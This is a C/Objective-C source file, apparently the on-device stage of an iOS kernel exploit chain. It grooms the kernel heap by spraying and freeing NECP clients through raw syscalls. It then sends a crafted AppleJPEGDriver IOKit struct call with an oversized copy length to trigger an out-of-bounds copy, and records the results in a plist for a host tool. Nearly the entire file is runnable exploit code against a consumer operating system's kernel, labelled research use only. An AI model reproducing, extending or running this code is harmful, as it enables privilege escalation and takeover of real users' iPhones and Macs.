/*
 * v047_payload — On-device V-047 AppleJPEGDriver + NECP heap groom payload
 *
 * Runs ON the iPhone (or macOS for lab testing). Writes v047_result.plist for
 * the l0fck Mac host to pull via AFC.
 *
 * Modes:
 *   check     Open AppleJPEGDriver, verify IOKit access, exit
 *   groom     NECP heap spray / hole-fill only
 *   fire      V-047 OOB trigger (--length required)
 *   full      groom then fire (default Neo-Chain stage)
 *
 * Build: make -C payloads/v047 [SDK=iphoneos|macosx]
 *
 * Copyright 2026 — Research use only.
 */

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#include <TargetConditionals.h>
#include "v047_result.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <errno.h>
#include <getopt.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

/* --- NECP syscalls (iOS/macOS) --- */
static int necp_open(void)
{
    return (int)syscall(501, 0, 0);
}

static int necp_client_add(int fd, char *cid, const void *params, size_t plen)
{
    return (int)syscall(502, fd, 1, cid, 16, params, plen);
}

static int necp_client_remove(int fd, const char *cid)
{
    return (int)syscall(502, fd, 2, cid, 16, NULL, 0);
}

static int necp_build_params(char *buf, int bufsize, int pid, int domain_len, uint8_t fill)
{
    int off = 0;
    if (off + 9 <= bufsize) {
        buf[off++] = 1;
        *(uint32_t *)(buf + off) = 4;
        off += 4;
        *(uint32_t *)(buf + off) = (uint32_t)pid;
        off += 4;
    }
    if (domain_len > 0 && off + 5 + domain_len <= bufsize) {
        buf[off++] = 3;
        *(uint32_t *)(buf + off) = (uint32_t)domain_len;
        off += 4;
        memset(buf + off, fill, (size_t)domain_len);
        buf[off + domain_len - 1] = 0;
        off += domain_len;
    }
    return off;
}

static int necp_heap_groom(int target_clients, int *out_created)
{
    int pid = (int)getpid();
    int fd = necp_open();
    if (fd < 0) {
        return -1;
    }

    char params[512];
    int plen = necp_build_params(params, sizeof(params), pid, 128, 'G');
    int total = target_clients > 0 ? target_clients : 256;
    char (*cids)[16] = calloc((size_t)total, 16);
    if (!cids) {
        close(fd);
        return -1;
    }

    int created = 0;
    for (int i = 0; i < total; i++) {
        memset(cids[i], 0, 16);
        if (necp_client_add(fd, cids[i], params, (size_t)plen) < 0) {
            break;
        }
        created++;
    }

    /* Hole-fill: free every other client, re-spray */
    for (int i = 0; i < created; i += 2) {
        necp_client_remove(fd, cids[i]);
    }
    usleep(50000);

    int refilled = 0;
    for (int i = 0; i < created; i += 2) {
        if (necp_client_add(fd, cids[i], params, (size_t)plen) >= 0) {
            refilled++;
        }
    }

    if (out_created) {
        *out_created = created + refilled;
    }

    free(cids);
    close(fd);
    return (created > 0) ? 0 : -1;
}

/* --- AppleJPEGDriver --- */

static io_connect_t v047_open_driver(void)
{
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleJPEGDriver"));
    if (!svc) {
        return 0;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        return 0;
    }
    return conn;
}

static void v047_build_payload(uint8_t *input, uint32_t input_size, uint32_t copy_length)
{
    memset(input, 0, input_size);
    *(uint32_t *)(input + 0x04) = 0x200;
    *(uint32_t *)(input + 0x0c) = 0x10;
    *(uint32_t *)(input + 0x14) = 0x40;
    *(uint32_t *)(input + 0x18) = 0x40;
    *(uint64_t *)(input + 0x30) = 1;
    *(uint32_t *)(input + 0x7c) = copy_length;

    for (uint32_t off = 0x84; off + 4 <= input_size; off += 4) {
        uint32_t tag = 0xC0FE0000u | ((off - 0x84) & 0xFFFFu);
        *(uint32_t *)(input + off) = tag;
    }
}

static uint32_t v047_fire(io_connect_t conn, uint32_t copy_length, uint32_t input_size, int count,
                          uint32_t *out_last_kr)
{
    uint8_t *input = calloc(1, input_size);
    uint8_t *output = calloc(1, input_size);
    if (!input || !output) {
        free(input);
        free(output);
        if (out_last_kr) *out_last_kr = 0xFFFFFFFFu;
        return 0;
    }

    v047_build_payload(input, input_size, copy_length);

    uint32_t last_kr = 0;
    uint32_t sent = 0;
    for (int i = 0; i < count; i++) {
        size_t outsz = input_size;
        kern_return_t kr = IOConnectCallStructMethod(conn, 5, input, input_size, output, &outsz);
        last_kr = (uint32_t)kr;
        sent++;
    }

    free(input);
    free(output);
    if (out_last_kr) {
        *out_last_kr = last_kr;
    }
    return sent;
}

/* --- Result plist --- */

static const char *result_path(void)
{
    const char *env = getenv("L0FCK_RESULT_PATH");
    if (env && env[0]) {
        return env;
    }
#if TARGET_OS_IPHONE
    return L0FCK_DEVICE_RESULT_PATH;
#else
    return "/tmp/v047_result.plist";
#endif
}

static int ensure_result_dir(const char *path)
{
    char dir[512];
    snprintf(dir, sizeof(dir), "%s", path);
    char *slash = strrchr(dir, '/');
    if (!slash) {
        return 0;
    }
    *slash = '\0';
    if (dir[0] == '\0') {
        return 0;
    }

    char partial[512];
    partial[0] = '\0';
    const char *p = dir;
    if (*p == '/') {
        snprintf(partial, sizeof(partial), "/");
        p++;
    }

    while (*p) {
        const char *next = strchr(p, '/');
        size_t seg_len = next ? (size_t)(next - p) : strlen(p);
        if (seg_len > 0) {
            size_t cur_len = strlen(partial);
            if (cur_len > 0 && partial[cur_len - 1] != '/') {
                strlcat(partial, "/", sizeof(partial));
            }
            strncat(partial, p, seg_len);
            mkdir(partial, 0755);
        }
        if (!next) {
            break;
        }
        p = next + 1;
    }
    return 0;
}

static void write_result_plist(const char *phase, bool driver_open, bool groom_ok,
                               int necp_clients, uint32_t v047_kr, uint32_t triggers,
                               uint32_t copy_length, bool krw_ready, uint64_t kbase,
                               uint64_t kslide, const char *error_msg)
{
    struct utsname u;
    uname(&u);

    const char *path = result_path();
    ensure_result_dir(path);

    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    dict[@(V047_KEY_VERSION)] = @(V047_RESULT_VERSION);
    dict[@(V047_KEY_PHASE)] = [NSString stringWithUTF8String:phase];
    dict[@(V047_KEY_DRIVER_OPEN)] = @(driver_open);
    dict[@(V047_KEY_NECP_GROOM_OK)] = @(groom_ok);
    dict[@(V047_KEY_NECP_CLIENTS)] = @(necp_clients);
    dict[@(V047_KEY_V047_KR)] = @(v047_kr);
    dict[@(V047_KEY_V047_TRIGGERS)] = @(triggers);
    dict[@(V047_KEY_COPY_LENGTH)] = @(copy_length);
    dict[@(V047_KEY_KRW_READY)] = @(krw_ready);
    dict[@(V047_KEY_KBASE)] = @(kbase);
    dict[@(V047_KEY_KSLIDE)] = @(kslide);
    dict[@(V047_KEY_MACHINE)] = [NSString stringWithUTF8String:u.machine];
    dict[@(V047_KEY_PID)] = @((int)getpid());

    if (error_msg && error_msg[0]) {
        dict[@(V047_KEY_ERROR)] = [NSString stringWithUTF8String:error_msg];
    }

    NSString *nspath = [NSString stringWithUTF8String:path];
    BOOL ok = [dict writeToFile:nspath atomically:YES];
    if (!ok) {
        fprintf(stderr, "[-] Failed to write result plist: %s (%s)\n", path, strerror(errno));
    } else {
        printf("[+] Result written: %s\n", path);
    }
}

/* --- Usage --- */

static void usage(const char *prog)
{
    printf("Usage: %s <mode> [options]\n\n", prog);
    printf("Modes:\n");
    printf("  check              Verify AppleJPEGDriver IOKit access\n");
    printf("  groom              NECP heap groom only\n");
    printf("  fire               Trigger V-047 OOB (requires --length)\n");
    printf("  full               groom + fire (Neo-Chain default)\n");
    printf("\nOptions:\n");
    printf("  --length N         copy_length for input[0x7c] (hex or decimal)\n");
    printf("  --input-size N     IO struct size (default 4096)\n");
    printf("  --count N          Trigger count (default 1)\n");
    printf("  --necp-clients N   NECP spray count (default 256)\n");
    printf("  --result PATH      Override result plist path\n");
    printf("  --help             This message\n");
}

int main(int argc, char *argv[])
{
    @autoreleasepool {
        if (argc < 2) {
            usage(argv[0]);
            return 1;
        }

        const char *mode = argv[1];
        uint32_t copy_length = 0x1004;
        uint32_t input_size = 4096;
        int trigger_count = 1;
        int necp_clients_target = 256;

        static struct option long_opts[] = {
            { "length",       required_argument, NULL, 'l' },
            { "input-size",   required_argument, NULL, 's' },
            { "count",        required_argument, NULL, 'n' },
            { "necp-clients", required_argument, NULL, 'c' },
            { "result",       required_argument, NULL, 'r' },
            { "help",         no_argument,       NULL, 'h' },
            { NULL, 0, NULL, 0 }
        };

        optind = 2;
        int opt;
        while ((opt = getopt_long(argc, argv, "l:s:n:c:r:h", long_opts, NULL)) != -1) {
            switch (opt) {
            case 'l': copy_length = (uint32_t)strtoul(optarg, NULL, 0); break;
            case 's': input_size = (uint32_t)strtoul(optarg, NULL, 0); break;
            case 'n': trigger_count = atoi(optarg); break;
            case 'c': necp_clients_target = atoi(optarg); break;
            case 'r': setenv("L0FCK_RESULT_PATH", optarg, 1); break;
            case 'h':
                usage(argv[0]);
                return 0;
            default:
                usage(argv[0]);
                return 1;
            }
        }

        bool do_check = (strcmp(mode, "check") == 0);
        bool do_groom = (strcmp(mode, "groom") == 0);
        bool do_fire = (strcmp(mode, "fire") == 0);
        bool do_full = (strcmp(mode, "full") == 0);

        if (!do_check && !do_groom && !do_fire && !do_full) {
            fprintf(stderr, "[-] Unknown mode: %s\n", mode);
            usage(argv[0]);
            return 1;
        }

        printf("=== l0fck V-047 On-Device Payload ===\n");
        printf("  mode=%s pid=%d\n\n", mode, getpid());

        bool driver_open = false;
        bool groom_ok = false;
        int necp_clients = 0;
        uint32_t v047_kr = 0;
        uint32_t triggers = 0;
        const char *phase = mode;
        const char *error = NULL;

        io_connect_t conn = 0;
        if (do_check || do_fire || do_full) {
            conn = v047_open_driver();
            driver_open = (conn != 0);
            if (!driver_open) {
                error = "AppleJPEGDriver IOServiceOpen failed";
                fprintf(stderr, "[-] %s\n", error);
                write_result_plist(phase, false, false, 0, 0, 0, copy_length, false, 0, 0, error);
                return 1;
            }
            printf("[+] AppleJPEGDriver opened (conn=0x%x)\n", conn);
        }

        if (do_check) {
            IOServiceClose(conn);
            write_result_plist("check", true, false, 0, 0, 0, 0, false, 0, 0, NULL);
            return 0;
        }

        if (do_groom || do_full) {
            printf("[*] NECP heap groom (%d clients)...\n", necp_clients_target);
            if (necp_heap_groom(necp_clients_target, &necp_clients) == 0) {
                groom_ok = true;
                printf("[+] NECP groom OK (%d client ops)\n", necp_clients);
            } else {
                error = "NECP heap groom failed";
                fprintf(stderr, "[-] %s\n", error);
            }
        }

        if ((do_fire || do_full) && driver_open) {
            if (copy_length == 0) {
                error = "fire/full requires non-zero --length";
            } else {
                printf("[!] Firing V-047 OOB: length=0x%x count=%d\n", copy_length, trigger_count);
                triggers = v047_fire(conn, copy_length, input_size, trigger_count, &v047_kr);
                printf("[*] Sent %u trigger(s), last kr=0x%08x\n", triggers, v047_kr);
            }
            IOServiceClose(conn);
            conn = 0;
        }

        if (conn) {
            IOServiceClose(conn);
        }

        /* kRW not yet implemented in payload — host must not treat as real R/W */
        write_result_plist(phase, driver_open, groom_ok, necp_clients, v047_kr, triggers,
                           copy_length, false, 0, 0, error);

        return (error != NULL) ? 1 : 0;
    }
}
